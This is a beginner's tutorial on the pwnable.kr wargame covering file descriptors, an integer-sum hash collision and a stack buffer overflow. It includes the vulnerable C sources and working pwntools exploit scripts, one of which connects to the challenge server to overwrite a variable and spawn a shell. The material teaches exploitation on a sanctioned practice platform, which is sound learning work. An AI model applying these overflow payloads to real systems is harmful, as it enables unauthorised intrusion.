üéØ What is Pwnable.kr?

Pwnable.kr is a wargame platform focused on binary exploitation (also called "pwning"). Think of it like a hacking playground where you learn how programs work at the deepest level - how memory works, how the computer processes instructions, and how to find and exploit vulnerabilities in compiled programs.

üí° What Does "Pwnable" Mean?

"Pwnable" comes from "pwn" (pronounced "pone"), which means to completely own or control something. In cybersecurity, it means exploiting a program to make it do something it wasn't supposed to do - like reading secret files, giving you a shell, or bypassing security checks.

What You'll Learn

  • How Programs Work - Understanding compiled code, assembly, and how the CPU executes instructions
  • Memory Layout - Stack, heap, how variables are stored, what happens when you call a function
  • Buffer Overflows - Writing past the end of arrays to control program execution
  • Reverse Engineering - Reading compiled code to understand what a program does
  • Exploitation Techniques - Format strings, return-oriented programming (ROP), shellcode injection
  • Tools & Debugging - GDB (debugger), pwntools (Python library), radare2, IDA Pro

üöÄ Challenge 1: fd (File Descriptors)

Let's start with the easiest pwnable.kr challenge! This teaches you about file descriptors, which are how programs interact with input/output.

Connect to the Challenge

ssh fd@pwnable.kr -p2222
# Password: guest

Understanding File Descriptors

üí° What is a File Descriptor?

A file descriptor is just a number that represents an open file or input/output stream. Every program has three automatic file descriptors:

  • 0 = stdin (standard input - keyboard)
  • 1 = stdout (standard output - screen)
  • 2 = stderr (error messages)

When you read(fd, buffer, size), you're reading from whatever fd points to. If fd=0, you're reading from keyboard. If fd=3, you're reading from a file you opened.

Look at the Code

cat fd.c

You'll see C code like this:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf[32];

int main(int argc, char* argv[]) {
    if(argc < 2) {
        printf("pass argv[1] a number\n");
        return 0;
    }
    
    int fd = atoi(argv[1]) - 0x1234;
    
    int len = read(fd, buf, 32);
    
    if(!strcmp("LETMEWIN\n", buf)) {
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    
    printf("learn about Linux file IO\n");
    return 0;
}

Breaking Down the Code

  1. Takes a number as argument
    argv[1] is the first command-line argument you pass to the program
  2. Calculates a file descriptor
    fd = atoi(argv[1]) - 0x1234
    It converts your argument to a number, then subtracts 0x1234 (which is 4660 in decimal)
  3. Reads from that file descriptor
    read(fd, buf, 32) reads up to 32 bytes from fd into buf
  4. Checks if you typed "LETMEWIN"
    strcmp("LETMEWIN\n", buf) compares the strings. If they match (returns 0), you win!

The Solution

üéØ Goal: We want fd to equal 0 (stdin) so the program reads from our keyboard, allowing us to type "LETMEWIN"!
  1. Do the math
    We need: fd = 0
    Equation: atoi(argv[1]) - 0x1234 = 0
    Therefore: atoi(argv[1]) = 0x1234
    Convert hex to decimal: 0x1234 = 4660
  2. Run the program
    ./fd 4660
  3. Type the magic string
    LETMEWIN
good job :)

üî® Challenge 2: collision (Hash Collisions)

This challenge teaches you about hash functions and integer overflows. You need to find an input that produces a specific hash value.

Connect & Examine

ssh col@pwnable.kr -p2222
# Password: guest

cat col.c

Understanding the Code

#include <stdio.h>
#include <string.h>

unsigned long hashcode = 0x21DD09EC;

unsigned long check_password(const char* p) {
    int* ip = (int*)p;
    int i;
    int res = 0;
    for(i = 0; i < 5; i++) {
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]) {
    if(argc < 2) {
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    
    if(strlen(argv[1]) != 20) {
        printf("passcode length should be 20 bytes\n");
        return 0;
    }
    
    if(hashcode == check_password(argv[1])) {
        system("/bin/cat flag");
        return 0;
    }
    
    printf("wrong passcode.\n");
    return 0;
}

Breaking It Down

üí° What's Happening Here?
  • Your input must be exactly 20 bytes long
  • The code treats those 20 bytes as 5 integers (4 bytes each: 5 √ó 4 = 20)
  • It adds those 5 integers together
  • The sum must equal 0x21DD09EC (568134124 in decimal)

The Math

  1. Target hash value
    0x21DD09EC in decimal = 568134124
  2. Divide by 5
    568134124 √∑ 5 = 113626824 remainder 4
    In hex: 113626824 = 0x06C5CEC8
  3. Account for remainder
    We need the sum to equal 568134124, so:
    4 integers of 0x06C5CEC8
    1 integer of 0x06C5CECC (add the remainder 4)

The Solution

We need to send 20 bytes where the integers add up correctly. In Python: 

#!/usr/bin/python3
# Save as solve_collision.py

from pwn import *

# Four integers of 0x06C5CEC8, one of 0x06C5CECC
payload = p32(0x06C5CEC8) * 4 + p32(0x06C5CECC)

# Run the program with our payload
io = process(['./col', payload])

# Print the output (flag)
print(io.recvall().decode())
üí° What is p32()?

p32() is a pwntools function that packs a number into 4 bytes. It converts the number 0x06C5CEC8 into the raw bytes \xC8\xCE\xC5\x06 (note the reversed order - this is "little-endian" byte order that x86 CPUs use).

Run It

python3 solve_collision.py

  • Integer division with remainders
  • Hexadecimal arithmetic
  • Using pwntools to pack integers

üí• Challenge 3: bof (Buffer Overflow)

Now we get to the CORE of binary exploitation: buffer overflows! This is when you write more data than a buffer can hold, allowing you to overwrite other variables or even control program execution.

‚ö†Ô∏è This Is The Big One!

Buffer overflows are the most famous vulnerability in binary exploitation. They've been used in countless real-world hacks. Understanding this concept opens the door to advanced techniques like shellcode injection and return-oriented programming (ROP).

Download the Binary

For this challenge, you'll connect remotely after solving it locally:

wget http://pwnable.kr/bin/bof
wget http://pwnable.kr/bin/bof.c
chmod +x bof

Look at the Code

cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key) {
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);  // DANGEROUS FUNCTION!
    
    if(key == 0xcafebabe) {
        system("/bin/sh");
    }
    else {
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]) {
    func(0xdeadbeef);
    return 0;
}

Understanding the Vulnerability

üí° What's Wrong Here?

The gets() function is EXTREMELY DANGEROUS! It reads input without checking the length. The buffer overflowme is only 32 bytes, but gets() will happily write 100, 1000, or 10000 bytes if you send them!

üí° Stack Grows Downward!

On most systems, the stack grows from high memory addresses to low. When you overflow overflowme, you write UP the stack, potentially overwriting key! This is the exploit!

Finding the Offset

We need to know: how many bytes until we reach key?

  1. Use GDB to inspect
    gdb ./bof
(gdb) disassemble func
  2. Look at the assembly
    You'll see something like:
    sub esp, 0x2c (allocates 44 bytes on stack)
    This means: 32 bytes for buffer + 12 bytes padding/alignment
  3. Calculate offset
    Buffer is 32 bytes, then there's usually some padding, then key
    Trial and error or GDB inspection shows: 52 bytes total

The Exploit

#!/usr/bin/python3
# Save as solve_bof.py

from pwn import *

# Connect to the remote server
io = remote('pwnable.kr', 9000)

# Craft payload: 52 bytes of junk + our target value
payload = b'A' * 52 + p32(0xcafebabe)

# Send it
io.sendline(payload)

# You now have a shell!
io.interactive()

üéì Pro Tips for Pwnable.kr

üìñ Read Everything

Source code is given - READ IT CAREFULLY! Look for dangerous functions like gets(), strcpy(), sprintf(). Understand the logic before you exploit.

üêõ Master GDB

Learn GDB commands: disassemble, break, run, x/20x $esp (examine stack), info registers. GDB is your X-ray vision!

üî¨ Test Locally First

Download binaries and test exploits on your machine before connecting remotely. It's faster and you can debug without time limits.

üìù Write Exploits

Don't try to send payloads manually. Write Python scripts with pwntools - it's reproducible, you can save your work, and it's how real exploits are written!

Useful Commands

# GDB basics
gdb ./binary           # Start debugging
(gdb) disassemble main # See assembly code
(gdb) break *0x08048123 # Set breakpoint at address
(gdb) run <<< $(python3 -c "print('A'*100)") # Run with input
